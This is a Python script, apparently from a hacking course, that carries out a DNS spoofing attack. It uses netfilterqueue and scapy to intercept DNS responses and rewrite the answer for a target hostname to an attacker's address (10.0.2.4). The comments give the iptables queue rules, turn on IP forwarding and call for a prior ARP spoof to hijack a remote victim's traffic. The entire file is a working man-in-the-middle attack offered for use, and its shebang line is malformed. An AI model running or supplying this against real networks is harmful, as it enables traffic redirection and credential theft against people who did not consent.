#!usr/bin/nav/env python
import netfilterqueue
import scapy.all as scapy
# How to run
# Running on the same computer to test
# Run iptables -I OUTPUT -j NFQUEUE --queue-num 0 ( creating a queue )
# Run iptables -I INPUT -j NFQUEUE --queue-num 0 ( creating a queue )
# Running against remote computer
# iptables --flush
# Run iptables -I FORWARD -j NFQUEUE --queue-num 0 ( creating a queue )
#  echo 1 > /proc/sys/net/ipv4/ip_forward
# Run arp spoof attack
# Run this program

def process_packet(packet):
    # get the detail packet printed
    # print(packet.get_payload())
    # packet.accept()

    # convert the packet to scapy to get the full control
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        target_website = scapy_packet[scapy.DNSQR].qname
        # print(scapy_packet.show())
        if 'www.stealmylogin.com' in target_website:
            # print(scapy_packet.show())
            spoof_response = scapy.DNSRR(rrname= target_website, rdata = "10.0.2.4")
            # modifying the packet
            scapy_packet[scapy.DNS].an = spoof_response
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
            print(scapy_packet.show())
    packet.accept()

# instance of netfilterqueue
queue = netfilterqueue.NetfilterQueue()
# binding the queue from the iptable and calling a
# call back function
queue.bind(0, process_packet)
queue.run()